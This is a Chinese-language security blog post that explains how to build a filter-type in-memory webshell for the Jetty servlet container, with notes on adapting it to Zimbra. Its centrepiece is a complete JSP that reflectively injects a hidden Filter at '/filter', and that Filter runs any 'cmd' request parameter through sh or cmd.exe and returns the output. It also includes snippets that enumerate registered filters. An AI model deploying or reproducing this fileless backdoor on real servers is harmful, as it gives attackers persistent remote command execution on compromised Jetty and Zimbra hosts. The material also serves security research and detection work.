---
layout: post
title: Java利用技巧——Jetty Filter型内存马
---


## 0x00 前言
---

关于Tomcat Filter型内存马的介绍资料有很多，但是Jetty Filter型内存马的资料很少，本文将要参照Tomcat Filter型内存马的设计思路，介绍Jetty Filter型内存马的实现思路和细节。

## 0x01 简介
---

本文将要介绍以下内容：

- Jetty调试环境搭建
- 实现思路
- 实现代码
- Zimbra环境下的Filter型内存马

## 0x02 Jetty调试环境搭建
---

### 1.添加调试参数

JDK 8版本对应的调试参数为：`java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=5005 -jar start.jar`

JDK 9及以上版本对应的调试参数为：`java -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005 -jar start.jar`

### 2.Web目录

位置为： `<jetty path>\webapps\ROOT`

### 3.断点位置

选择文件`servlet-api-3.1.jar`，依次选中`javax.servlet`->`http`->`HttpServlet.class`，在合适的位置下断点，当运行到断点时，可以查看request对象的完整结构

## 0x03 实现思路
---

相关参考资料：

https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java
https://blog.csdn.net/xdeclearn/article/details/125969653

[参考资料1](https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/jetty/FilterBasedWithoutRequest.java)是通过JmxMBeanServer获得webappclassloaer，进而通过反射调用相关方法添加一个Filter

[参考资料2](https://blog.csdn.net/xdeclearn/article/details/125969653)是通过Thread获得webappclassloaer，进而通过反射调用相关方法添加Servlet型内存马的方法

我在实际测试过程中，发现通过JmxMBeanServer获得webappclassloaer的方法不够通用，尤其是无法在Zimbra环境下使用

因此，最终改为使用Thread获得webappclassloaer，进而通过反射调用相关方法添加Filter型内存马

## 0x04 实现代码
---

### 1.添加Filter

Jetty下可用的完整代码如下：

```
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%@ page import="java.util.Scanner"%>
<%@ page import="java.util.EnumSet"%>
<%@ page import="java.io.*"%>

<%
    String filterName = "myFilter";
    String urlPattern = "/filter";
    Filter filter = new Filter() {
        @Override
        public void init(FilterConfig filterConfig) throws ServletException {
        }
        @Override
        public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
            HttpServletRequest req = (HttpServletRequest) servletRequest;
            if (req.getParameter("cmd") != null) {
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[] {"sh", "-c", req.getParameter("cmd")} : new String[] {"cmd.exe", "/c", req.getParameter("cmd")};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner( in ).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                servletResponse.getWriter().write(output);
                servletResponse.getWriter().flush();
                return;
            }
            filterChain.doFilter(servletRequest, servletResponse);
        }
        @Override
        public void destroy() {
        }
    };

    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
                fieldFilters.setAccessible(true);
                Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                boolean flag = false;
                for(Object f:filters){
                    Field fieldName = f.getClass().getSuperclass().getDeclaredField("_name");
                    fieldName.setAccessible(true);
                    String name = (String) fieldName.get(f);
                    if(name.equals(filterName)){
                        flag = true;
                        break;
                    }
                }
                if(flag){
                    out.println("[-] Filter " + filterName + " exists.<br>");
                    return;
                }
                out.println("[+] Add Filter: " + filterName + "<br>");
                out.println("[+] urlPattern: " + urlPattern + "<br>");
                ClassLoader classLoader = servletHandler.getClass().getClassLoader();
                Class sourceClazz = null;
                Object holder = null;
                Field field = null;
                try{
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.Source");
                    field = sourceClazz.getDeclaredField("JAVAX_API");
                    Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(servletHandler, field.get(null));
                }catch(ClassNotFoundException e){
                    sourceClazz = classLoader.loadClass("org.eclipse.jetty.servlet.BaseHolder$Source");
                    Method method = servletHandler.getClass().getMethod("newFilterHolder", sourceClazz);
                    holder = method.invoke(servletHandler, Enum.valueOf(sourceClazz, "JAVAX_API"));
                }
                holder.getClass().getMethod("setName", String.class).invoke(holder, filterName);               
                holder.getClass().getMethod("setFilter", Filter.class).invoke(holder, filter);
                servletHandler.getClass().getMethod("addFilter", holder.getClass()).invoke(servletHandler, holder);

                Class  clazz         = classLoader.loadClass("org.eclipse.jetty.servlet.FilterMapping");
                Object filterMapping = clazz.newInstance();
                Method method        = filterMapping.getClass().getDeclaredMethod("setFilterHolder", holder.getClass());
                method.setAccessible(true);
                method.invoke(filterMapping, holder);
                filterMapping.getClass().getMethod("setPathSpecs", String[].class).invoke(filterMapping, new Object[]{new String[]{urlPattern}});
                filterMapping.getClass().getMethod("setDispatcherTypes", EnumSet.class).invoke(filterMapping, EnumSet.of(DispatcherType.REQUEST));
                servletHandler.getClass().getMethod("prependFilterMapping", filterMapping.getClass()).invoke(servletHandler, filterMapping);

            }     
        }
    }
%>
```

### 2.枚举Filter

#### (1)通过request对象调用getFilterRegistrations枚举Filter

Jetty下可用的完整代码如下：

```
<%@ page import="java.lang.reflect.Method "%>
<%
    ServletContext servletContext = request.getServletContext();
    Method m1 = servletContext.getClass().getSuperclass().getDeclaredMethod("getFilterRegistrations");
    Object obj1 = m1.invoke(servletContext);
    out.println(obj1); 
%>
```

对应命令为：`request.getSession().getServletContext().getClass().getSuperclass().getDeclaredMethod("getFilterRegistrations").invoke(request.getSession().getServletContext())`

**注：**

查看`servletContext`支持的方法：

```
<%@ page import="java.lang.reflect.Method "%>
<%
    ServletContext servletContext = request.getServletContext();
    Method[] methods = servletContext.getClass().getSuperclass().getDeclaredMethods();
    for(Method method:methods){
        out.print(method.getName() + "<br>");
}
%>
```

返回结果如下：

```
createInstance
addListener
addListener
addListener
getFilterRegistration
getFilterRegistrations
setSessionTrackingModes
getEffectiveSessionTrackingModes
getJspConfigDescriptor
getSessionCookieConfig
getDefaultSessionTrackingModes
getServletRegistration
getServletRegistrations
getNamedDispatcher
setJspConfigDescriptor
setInitParameter
declareRoles
destroyFilter
addServlet
addServlet
addServlet
destroyServlet
addFilter
addFilter
addFilter
checkDynamic
```

#### (2)通过Thread获得webappclassloaer，通过反射读取_filters属性来枚举Filter

Jetty下可用的完整代码如下：

```
<%@ page import="java.lang.reflect.Field"%>
<%@ page import="java.lang.reflect.Method"%>
<%
    Method threadMethod = Class.forName("java.lang.Thread").getDeclaredMethod("getThreads");
    threadMethod.setAccessible(true);
    Thread[] threads = (Thread[]) threadMethod.invoke(null);
    ClassLoader threadClassLoader = null;

    for (Thread thread:threads)
    {
        threadClassLoader = thread.getContextClassLoader();
        if(threadClassLoader != null){
            if(threadClassLoader.toString().contains("WebAppClassLoader")){
                Field fieldContext = threadClassLoader.getClass().getDeclaredField("_context");
                fieldContext.setAccessible(true);
                Object webAppContext = fieldContext.get(threadClassLoader);
                Field fieldServletHandler = webAppContext.getClass().getSuperclass().getDeclaredField("_servletHandler");
                fieldServletHandler.setAccessible(true);
                Object servletHandler = fieldServletHandler.get(webAppContext);
                Field fieldFilters = servletHandler.getClass().getDeclaredField("_filters");
                fieldFilters.setAccessible(true);
                Object[] filters = (Object[]) fieldFilters.get(servletHandler);
                boolean flag = false;
                for(Object f:filters){
                    out.print(f + "<br>");
                }
            }     
        }
    }
%>
```

**注：**

该方法在Zimbra环境下会存在多个重复结果

## 0x05 Zimbra环境下的Filter型内存马
---

在Zimbra环境下，思路同样为使用Thread获得webappclassloaer，进而通过反射调用相关方法添加Filter型内存马

但是由于Zimbra存在多个名为WebAppClassLoader的线程，所以在添加Filter时需要修改判断条件，避免提前退出，在实例代码的基础上直接修改即可

## 0x06 利用思路
---

Filter型内存马的优点是不需要写入文件，但是会在服务重启时失效

## 0x07 小结
---

本文介绍了Jetty Filter型内存马的实现思路和细节，给出了可供测试的代码，分享了Zimbra环境的利用方法。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)
